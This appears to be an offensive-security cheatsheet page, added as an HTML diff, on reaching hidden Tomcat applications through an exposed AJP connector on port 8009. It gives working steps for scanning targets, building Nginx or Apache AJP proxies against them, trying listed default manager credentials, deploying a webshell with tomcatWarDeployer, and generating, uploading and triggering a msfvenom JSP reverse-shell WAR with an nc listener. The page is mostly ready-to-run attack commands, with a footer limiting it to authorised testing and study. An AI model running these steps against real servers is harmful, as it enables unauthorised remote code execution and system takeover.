@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AJP &amp; Tomcat · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>AJP &amp; Tomcat</h1><p class="cx-lede">Reaching hidden Tomcat applications through exposed AJP connectors using Nginx, Apache, or direct AJP clients.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1210</span><span class="cx-tag">D3FEND D3-ACH, D3-NI, D3-ITF</span><span class="cx-tag">IMPACT FileRead, RCE</span><span class="cx-tag">OWASP A02</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Apache JServ Protocol (AJP) is Tomcat's binary back-channel - port 8009 by default. When AJP is exposed externally, you can reach the Tomcat manager and any backend apps that the operator thought were behind a reverse proxy. Two ways in: front it with your own Nginx/Apache configured as an AJP client, or hit it directly with <a href="ghostcat/index.html">Ghostcat</a> (CVE-2020-1938) for file disclosure / RCE.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Detection
+nmap -sV -p 8009 &lt;TARGET&gt;
+# Look for: ajp13 open, &quot;Apache Jserv&quot; in service banner
+
+# Direct exploitation (preferred)
+# → see Ghostcat page
+
+# Proxy-based access (when Ghostcat is patched)
+# → set up Nginx or Apache as AJP client (below)</code></pre></figure>
+<p>Success indicator: the Tomcat default page or <code>/manager/html</code> reachable from your browser via the local proxy.</p>
+<h2 id="when-youll-see-this">When you'll see this</h2>
+<ul>
+<li>Internal pentests with a poorly segmented network</li>
+<li>External assessments where someone exposed 8009 thinking it was internal-only</li>
+<li>Container deployments where AJP and HTTP both bind <code>0.0.0.0</code></li>
+<li>Internet-wide scans (Shodan facet <code>port:8009</code>) - common enough to find in scope</li>
+</ul>
+<h2 id="detection">Detection</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Service detection
+nmap -sV -p 8009,8080,8443 &lt;TARGET&gt;
+
+# Faster sweep
+nmap -p 8009 --open &lt;NETWORK&gt;/24
+
+# Confirm AJP responsiveness
+nmap -p 8009 --script ajp-headers,ajp-methods &lt;TARGET&gt;</code></pre></figure>
+<p>Look for <code>ajp13</code> in service banners. If port 8080 is also open and shows a Tomcat default page, the AJP connector is almost certainly the back-channel.</p>
+<h2 id="nginx-as-ajp-client">Nginx as AJP client</h2>
+<p>When <a href="ghostcat/index.html">Ghostcat</a> is patched but the AJP port is still reachable, fronting it with Nginx gives you a browser-friendly window into Tomcat.</p>
+<p>Stock Nginx doesn't ship with AJP support - you compile from source with <code>nginx_ajp_module</code>.</p>
+<div class="cx-steps">
+<ol>
+<li><strong>Get Nginx source and the module:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">wget https://nginx.org/download/nginx-1.27.0.tar.gz
+tar -xzvf nginx-1.27.0.tar.gz
+git clone https://github.com/dvershinin/nginx_ajp_module.git
+sudo apt install -y libpcre3-dev zlib1g-dev libssl-dev</code></pre></figure>
+<ol start="2">
+<li><strong>Compile with the AJP module:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">cd nginx-1.27.0
+./configure --add-module=../nginx_ajp_module \
+    --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx \
+    --modules-path=/usr/lib/nginx/modules
+make &amp;&amp; sudo make install
+nginx -V 2&gt;&amp;1 | grep ajp</code></pre></figure>
+<ol start="3">
+<li><strong>Configure to point at the target.</strong> Replace the entire <code>server</code> block in <code>/etc/nginx/conf/nginx.conf</code> and add inside <code>http { ... }</code>:</li>
+</ol>
+<figure class="cx-code"><figcaption>nginx</figcaption><pre><code class="language-nginx">upstream tomcats {
+    server &lt;TARGET&gt;:8009;
+    keepalive 10;
+}
+
+server {
+    listen 8000;
+    location / {
+        ajp_keep_conn on;
+        ajp_pass tomcats;
+    }
+}</code></pre></figure>
+<p>Use port 8000 or another free local port - port 80 is often in use.</p>
+<ol start="4">
+<li><strong>Start and verify:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sudo nginx
+curl -i http://127.0.0.1:8000/</code></pre></figure>
+<p>Expect the Tomcat default page in the response body.</p>
+<ol start="5">
+<li><strong>Reach the manager:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -i http://127.0.0.1:8000/manager/html -u tomcat:s3cret</code></pre></figure>
+<p>Default credentials worth trying: <code>tomcat:tomcat</code>, <code>tomcat:s3cret</code>, <code>admin:admin</code>, <code>admin:tomcat</code>, <code>manager:manager</code>. Tomcat ships locked by default - credentials only exist if someone added them, which means someone <em>did</em> add them.</p>
+</div>
+<h2 id="apache-as-ajp-client">Apache as AJP client</h2>
+<p>Apache's <code>mod_proxy_ajp</code> is precompiled - faster setup than Nginx if Apache is already on your system.</p>
+<div class="cx-steps">
+<ol>
+<li><strong>Install and enable modules:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sudo apt install -y libapache2-mod-jk
+sudo a2enmod proxy proxy_ajp proxy_http</code></pre></figure>
+<ol start="2">
+<li><strong>Create the site config</strong> at <code>/etc/apache2/sites-available/ajp-proxy.conf</code>:</li>
+</ol>
+<figure class="cx-code"><figcaption>apache</figcaption><pre><code class="language-apache">&lt;VirtualHost *:8000&gt;
+    &lt;Proxy *&gt;
+        Require all granted
+    &lt;/Proxy&gt;
+    ProxyPass / ajp://&lt;TARGET&gt;:8009/
+    ProxyPassReverse / ajp://&lt;TARGET&gt;:8009/
+&lt;/VirtualHost&gt;</code></pre></figure>
+<p>Add <code>Listen 8000</code> to <code>/etc/apache2/ports.conf</code> if needed.</p>
+<ol start="3">
+<li><strong>Enable and start:</strong></li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sudo a2ensite ajp-proxy
+sudo systemctl restart apache2
+curl -i http://127.0.0.1:8000/</code></pre></figure>
+</div>
+<h2 id="direct-ajp-clients">Direct AJP clients</h2>
+<p>When you don't want to spin up a webserver, lightweight AJP clients exist:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># AJPy - Python AJP client
+pip install ajpy
+python -m ajpy.tomcat &lt;TARGET&gt; 8009 --webapp=manager
+
+# tomcatWarDeployer - drops a webshell after auth
+git clone https://github.com/mgeeky/tomcatWarDeployer
+./tomcatWarDeployer.py -U tomcat -P s3cret -H &lt;LHOST&gt; -p &lt;LPORT&gt; &lt;TARGET&gt;:8009</code></pre></figure>
+<h2 id="post-access-tomcat-exploitation">Post-access - Tomcat exploitation</h2>
+<p>Once you have a Tomcat session (manager UI, <code>/manager/text</code>, or shell):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Generate a war reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f war -o shell.war
+
+# Deploy via manager API (requires manager-script role)
+curl -u tomcat:s3cret --upload-file shell.war \
+    &quot;http://127.0.0.1:8000/manager/text/deploy?path=/shell&quot;
+
+# Trigger
+curl http://127.0.0.1:8000/shell/
+
+# Listen
+nc -lvnp &lt;LPORT&gt;</code></pre></figure>
+<p>The <code>manager-script</code> role is what enables programmatic deployment. The <code>manager-gui</code> role enables the web UI but not <code>/manager/text/*</code>. Sometimes a tester has GUI but no script - use the GUI's "WAR file to deploy" upload form in that case.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>AJP secret required.</strong> Tomcat 9.0.31+ defaults to requiring <code>requiredSecret</code> on the AJP connector. If your client gets <code>403 Forbidden</code> from AJP, the connector is in protected mode. Without the secret you can't drive it; check whether the deploying admin disabled the protection (common during migrations) or whether <a href="ghostcat/index.html">Ghostcat</a> (which doesn't need the secret on older Tomcat) applies.</li>
+<li><strong>Manager returns 403 from external IP.</strong> The manager app has its own access control via <code>RemoteAddrValve</code>, typically restricted to <code>127.0.0.1</code>. Your AJP-proxied request <em>appears</em> to come from local Tomcat's perspective only if the AJP client passes the right headers. Apache and Nginx AJP modules generally do; bare AJP clients sometimes don't.</li>
+<li><strong>Module compile fails on Nginx.</strong> Missing dev headers. Install <code>libpcre3-dev</code>, <code>zlib1g-dev</code>, <code>libssl-dev</code>. On RHEL/Fedora the package names differ (<code>pcre-devel</code>, <code>zlib-devel</code>, <code>openssl-devel</code>).</li>
+<li><strong>Connection refused from AJP port.</strong> Tomcat's AJP connector binds <code>127.0.0.1</code> by default in modern versions. If the port appears closed externally but the Tomcat HTTP port is open, AJP is bound locally and Ghostcat won't work either.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>AJP exposure is a configuration mistake, not a vulnerability per se - the protocol is functioning as designed. The bug, when one exists, is Ghostcat (which exploits the AJP attribute-injection design flaw). When you find an AJP port, check Ghostcat first; the proxy approach is the fallback for patched Tomcat where AJP remained externally bound.</p></article><nav class="cx-pager"><a class="cx-next" href="../includes/ssi/index.html">Next: SSI Injection</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
